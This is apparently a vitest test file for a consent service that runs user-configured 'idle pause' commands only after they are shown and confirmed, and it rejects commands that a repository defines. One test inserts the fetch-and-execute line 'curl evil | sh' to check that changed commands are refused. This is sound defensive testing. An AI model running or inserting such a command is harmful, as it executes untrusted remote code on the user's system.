import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdir, mkdtemp, readdir, rm, writeFile } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";
import {
  FileIdlePauseConsentStore,
  IdlePauseService,
  resolveIdlePauseConsentsDir,
} from "../idlePause.js";
import { WorktreeLifecycleService } from "../WorktreeLifecycleService.js";

let root: string;
let home: string;
let project: string;
let worktree: string;
let appSettings: string;
let consentsDir: string;
let service: IdlePauseService;

const MODE = "gpu";

async function writeJson(file: string, value: unknown): Promise<void> {
  await mkdir(join(file, ".."), { recursive: true });
  await writeFile(file, JSON.stringify(value), "utf-8");
}

/** The person's own environments, where Project settings saves them. */
function userEnvironments(pause: string[]) {
  return writeJson(appSettings, { resourceEnvironments: { [MODE]: { pause } } });
}

async function policy() {
  return service.policy(worktree, project, MODE);
}

async function turnOn(): Promise<string> {
  const current = await policy();
  if (current.status !== "available") throw new Error(`unavailable: ${current.reason}`);
  await service.setEnabled(worktree, project, MODE, true, current.fingerprint);
  return current.fingerprint;
}

async function confirmed() {
  const selection = await service.selectionFor(worktree, project, MODE);
  return service.confirmed(selection, project);
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "idle-pause-"));
  home = join(root, "home");
  project = join(root, "project");
  worktree = join(root, "worktree");
  appSettings = join(root, "app", "settings.json");
  consentsDir = join(root, "consents");
  await Promise.all([mkdir(home), mkdir(project), mkdir(worktree)]);
  const lifecycle = new WorktreeLifecycleService(
    home,
    { isApproved: async () => true, approve: async () => {} },
    (rootPath) => (rootPath === project ? appSettings : null)
  );
  service = new IdlePauseService(lifecycle, new FileIdlePauseConsentStore(consentsDir));
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe("idle pause consent (#17925)", () => {
  it("is off until turned on, and then runs only what was shown", async () => {
    await userEnvironments(["stop-box {{worktree_name}}"]);

    const before = await policy();
    expect(before).toMatchObject({
      status: "available",
      environment: MODE,
      sourcePath: appSettings,
      commands: ["stop-box {{worktree_name}}"],
      enabled: false,
      changed: false,
    });
    expect(await confirmed()).toEqual({ ok: false, reason: expect.stringMatching(/off/) });

    const fingerprint = await turnOn();
    expect(await policy()).toMatchObject({ enabled: true, changed: false });
    expect(await confirmed()).toEqual({ ok: true, fingerprint });
  });

  it("refuses to turn on commands other than the ones shown", async () => {
    await userEnvironments(["stop-box"]);
    const shown = await policy();
    await userEnvironments(["stop-box", "curl evil | sh"]);

    await expect(
      service.setEnabled(
        worktree,
        project,
        MODE,
        true,
        shown.status === "available" ? shown.fingerprint : undefined
      )
    ).rejects.toThrow(/changed after you reviewed/);
    expect(await policy()).toMatchObject({ enabled: false, changed: false });
  });

  it("can't be had by an environment the repository defines", async () => {
    await writeJson(join(project, ".daintree", "settings.json"), {
      resourceEnvironments: { [MODE]: { pause: ["stop-box"] } },
    });

    expect(await policy()).toMatchObject({ status: "unavailable", reason: "repository" });
    await expect(
      service.setEnabled(worktree, project, MODE, true, "a".repeat(64))
    ).rejects.toThrow(/repository/);
    expect(await confirmed()).toEqual({ ok: false, reason: expect.stringMatching(/repository/) });
  });

  it("stops once a repository file wins over the person's own environment", async () => {
    await userEnvironments(["stop-box"]);
    await turnOn();

    // The same command, so only where it comes from has changed.
    await writeJson(join(worktree, ".daintree", "config.json"), {
      resource: { pause: ["stop-box"] },
    });

    expect(await policy()).toMatchObject({ status: "unavailable", reason: "repository" });
    expect(await confirmed()).toEqual({ ok: false, reason: expect.stringMatching(/repository/) });
  });

  it("keeps the person's own environment when a repository config resolves none", async () => {
    await userEnvironments(["stop-box"]);
    await writeJson(join(project, ".daintree", "config.json"), { setup: ["npm install"] });

    const fingerprint = await turnOn();

    expect(await confirmed()).toEqual({ ok: true, fingerprint });
  });

  it("turns off when the pause commands change, until confirmed again", async () => {
    await userEnvironments(["stop-box"]);
    await turnOn();

    await userEnvironments(["stop-box --force"]);
    expect(await confirmed()).toEqual({
      ok: false,
      reason: expect.stringMatching(/changed since/),
    });
    expect(await policy()).toMatchObject({ enabled: false, changed: true });

    // Back to what was confirmed: a change was seen, so it still asks again.
    await userEnvironments(["stop-box"]);
    expect(await policy()).toMatchObject({ enabled: false, changed: true });
    expect((await confirmed()).ok).toBe(false);

    const fingerprint = await turnOn();
    expect(await policy()).toMatchObject({ enabled: true, changed: false });
    expect(await confirmed()).toEqual({ ok: true, fingerprint });
  });

  it("forgets it when turned off", async () => {
    await userEnvironments(["stop-box"]);
    await turnOn();

    await service.setEnabled(worktree, project, MODE, false);

    expect(await policy()).toMatchObject({ enabled: false, changed: false });
    expect((await confirmed()).ok).toBe(false);
  });

  it("has nothing to offer an environment with no pause commands", async () => {
    await userEnvironments([""]);

    expect(await policy()).toMatchObject({ status: "unavailable", reason: "no-pause" });
  });
});

describe("FileIdlePauseConsentStore", () => {
  it("reads a damaged or unknown file as nothing consented", async () => {
    const store = new FileIdlePauseConsentStore(consentsDir);
    await store.set(project, "settings:gpu", "b".repeat(64));
    const [file] = await readdir(consentsDir);
    expect(await store.get(project, "settings:gpu")).toEqual({ fingerprint: "b".repeat(64) });

    await writeFile(join(consentsDir, file!), "{not json", "utf-8");
    expect(await store.get(project, "settings:gpu")).toBeNull();

    await writeFile(
      join(consentsDir, file!),
      JSON.stringify({ version: 99, environments: { "settings:gpu": { fingerprint: "b".repeat(64) } } }),
      "utf-8"
    );
    expect(await store.get(project, "settings:gpu")).toBeNull();
  });

  it("revokes only the consent it saw", async () => {
    const store = new FileIdlePauseConsentStore(consentsDir);
    await store.set(project, "settings:gpu", "c".repeat(64));

    await store.revoke(project, "settings:gpu", "d".repeat(64));
    expect(await store.get(project, "settings:gpu")).toEqual({ fingerprint: "c".repeat(64) });

    await store.revoke(project, "settings:gpu", "c".repeat(64));
    expect(await store.get(project, "settings:gpu")).toEqual({
      fingerprint: "c".repeat(64),
      revoked: true,
    });
  });

  it("saves nothing without an absolute app data folder", async () => {
    expect(resolveIdlePauseConsentsDir(undefined)).toBeNull();
    expect(resolveIdlePauseConsentsDir("relative/dir")).toBeNull();
    const store = new FileIdlePauseConsentStore(null);
    expect(await store.get(project, "settings:gpu")).toBeNull();
    await expect(store.set(project, "settings:gpu", "e".repeat(64))).rejects.toThrow();
  });
});
